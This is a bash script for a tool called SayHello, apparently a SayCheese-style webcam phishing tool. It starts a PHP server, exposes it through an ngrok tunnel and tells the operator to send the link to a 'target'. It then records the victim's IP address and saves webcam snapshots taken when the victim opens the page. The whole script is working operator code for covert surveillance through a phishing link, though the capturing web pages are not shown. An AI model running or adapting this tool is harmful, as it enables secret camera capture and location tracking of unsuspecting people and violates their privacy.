#!/bin/bash
# SayHello based on SayChesse
# https://www.github.com/100security/sayhello
# by: Marcos Henrique | @100security

trap 'printf "\n";stop' 2

# Ngrok API Key
NGROK_API="YOUR-NGROK-API"

banner() {

  printf "\e[1;92m- - - - - - - - - - - - - - - - - - - - - -\e[0m\n"
  printf "\n"
  printf "\e[1;92m   _____             _    _      _ _      \e[0m\n"
  printf "\e[1;92m  / ____|           | |  | |    | | |      \e[0m\n"
  printf "\e[1;92m | (___   __ _ _   _| |__| | ___| | | ___  \e[0m\n"
  printf "\e[1;92m  \___ \ / _\` | | | |  __  |/ _ \ | |/ _ \ \e[0m\n"
  printf "\e[1;92m  ____) | (_| | |_| | |  | |  __/ | | (_) |\e[0m\n"
  printf "\e[1;92m |_____/ \__,_|\__, |_|  |_|\___|_|_|\___/ \e[0m\n"
  printf "\e[1;92m                __/ |                     \e[0m\n"
  printf "\e[1;92m               |___/                      \e[0m\n"
  printf "\n"
  printf "\e[1;92m      github.com/100security/sayhello\e[0m\n"
  printf "\n"
  printf "\e[1;92m- - - - - - - - - - - - - - - - - - - - - -\e[0m\n"
  printf "\n"
}

stop() {
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Cleaning up...\e[0m\n"
  
  # Check and kill ngrok
  if pgrep -x "ngrok" > /dev/null; then
    pkill -f ngrok > /dev/null 2>&1
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Ngrok stopped\e[0m\n"
  fi
  
  # Check and kill PHP
  if pgrep -x "php" > /dev/null; then
    pkill -f php > /dev/null 2>&1
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] PHP server stopped\e[0m\n"
  fi
  
  # Remove temporary files
  rm -f logs/ip.txt
  
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Exiting...\e[0m\n"
  exit 1
}

check_dependencies() {
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Checking dependencies...\e[0m\n"
  
  # Check for PHP
  if ! command -v php > /dev/null 2>&1; then
    printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] PHP not found. Installing...\e[0m\n"
    sudo apt update > /dev/null 2>&1
    sudo apt install -y php > /dev/null 2>&1
    
    if ! command -v php > /dev/null 2>&1; then
      printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Error installing PHP. Please install it manually.\e[0m\n"
      exit 1
    fi
  fi
  
  # Check for curl
  if ! command -v curl > /dev/null 2>&1; then
    printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Curl not found. Installing...\e[0m\n"
    sudo apt update > /dev/null 2>&1
    sudo apt install -y curl > /dev/null 2>&1
    
    if ! command -v curl > /dev/null 2>&1; then
      printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Error installing Curl. Please install it manually.\e[0m\n"
      exit 1
    fi
  fi
  
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] All dependencies are installed!\e[0m\n"
}

catch_ip() {
  ip=$(grep -a 'IP:' logs/ip.txt | cut -d " " -f2 | tr -d '\r')
  IFS=$'\n'
  printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Target IP:\e[0m\e[1;77m %s\e[0m\n" $ip
  
  # Save IP to log file with timestamp
  echo "$(date '+%Y-%m-%d %H:%M:%S') - $ip" >> logs/captured_ips.log
  
  # Remove the temporary IP file
  rm -f logs/ip.txt
}

checkfound() {
  printf "\n"
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets...\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
  
  while true; do
    if [[ -e "logs/ip.txt" ]]; then
      printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
      catch_ip
    fi

    if [[ -e "logs/log.log" ]]; then
      printf "\n\e[1;92m[\e[0m+\e[1;92m] Camera snapshot received!\e[0m\n"
      
      # Move the snapshot to a timestamped file
      timestamp=$(date +%Y%m%d_%H%M%S)
      mkdir -p captures
      mv logs/log.log "captures/snapshot_$timestamp.jpg"
      printf "\e[1;92m[\e[0m+\e[1;92m] Saved as captures/snapshot_$timestamp.jpg\e[0m\n"
    fi
    
    sleep 0.5
  done
}

install_ngrok() {
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Setting up Ngrok...\e[0m\n"
  
  # Check if ngrok is already installed
  if command -v ngrok > /dev/null 2>&1; then
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Ngrok already installed.\e[0m\n"
  else
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Installing Ngrok using official method...\e[0m\n"
    
    # Install Ngrok via official method
    curl -sSL https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && \
    echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list && \
    sudo apt update > /dev/null 2>&1 && \
    sudo apt install -y ngrok > /dev/null 2>&1
    
    if ! command -v ngrok > /dev/null 2>&1; then
      printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Failed to install Ngrok via apt. Trying alternative method...\e[0m\n"
      
      # Alternative method - direct download
      curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/ngrok.gpg && \
      echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list && \
      sudo apt update && sudo apt install ngrok
      
      if ! command -v ngrok > /dev/null 2>&1; then
        printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Failed to install Ngrok. Please install it manually.\e[0m\n"
        exit 1
      fi
    fi
  fi
  
  # Configure Ngrok with API key
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configuring Ngrok with authtoken...\e[0m\n"
  ngrok config add-authtoken $NGROK_API > /dev/null 2>&1
  
  # Verify Ngrok configuration
  if [ $? -ne 0 ]; then
    printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Failed to configure Ngrok with authtoken. Please check your token.\e[0m\n"
    exit 1
  fi
}

start_servers() {
  # Create necessary directories
  mkdir -p captures
  
  # Kill any existing PHP or Ngrok processes
  pkill -f php > /dev/null 2>&1
  pkill -f ngrok > /dev/null 2>&1
  
  # Start PHP server
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting PHP server on port 3333...\e[0m\n"
  php -S 0.0.0.0:3333 > /dev/null 2>&1 &
  sleep 2
  
  # Start Ngrok
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting Ngrok tunnel...\e[0m\n"
  ngrok http 3333 > /dev/null 2>&1 &
  
  # Wait for Ngrok to establish connection
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for Ngrok connection (10 seconds)...\e[0m\n"
  sleep 10
  
  # Get the Ngrok URL using the API
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Retrieving Ngrok URL...\e[0m\n"
  
  # Try to get the URL using various methods
  ngrok_url=""
  
  # Method 1: Using the API endpoint
  ngrok_url=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o '"public_url":"[^"]*"' | head -1 | sed 's/"public_url":"//g' | sed 's/"//g')
  
  # Method 2: If the first method fails, try another pattern
  if [[ -z "$ngrok_url" ]]; then
    ngrok_url=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok-free\.app")
  fi
  
  # Method 3: Try another pattern
  if [[ -z "$ngrok_url" ]]; then
    ngrok_url=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok\.io")
  fi
  
  # Method 4: Parse the JSON with jq if available
  if [[ -z "$ngrok_url" ]] && command -v jq > /dev/null 2>&1; then
    ngrok_url=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[0].public_url')
  fi
  
  # Check if we got a URL
  if [[ -z "$ngrok_url" || "$ngrok_url" == "null" ]]; then
    printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Failed to get Ngrok URL automatically.\e[0m\n"
    
    # Show Ngrok interface URL for manual checking
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Please check http://127.0.0.1:4040 in your browser to see the Ngrok URL.\e[0m\n"
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Enter the Ngrok URL manually: \e[0m"
    read ngrok_url
  fi
  
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Send this link to the target: \e[0m\e[1;77m%s\e[0m\n" $ngrok_url
  
  # Start monitoring for connections
  checkfound
}

# Main execution
clear
banner
check_dependencies
install_ngrok
start_servers
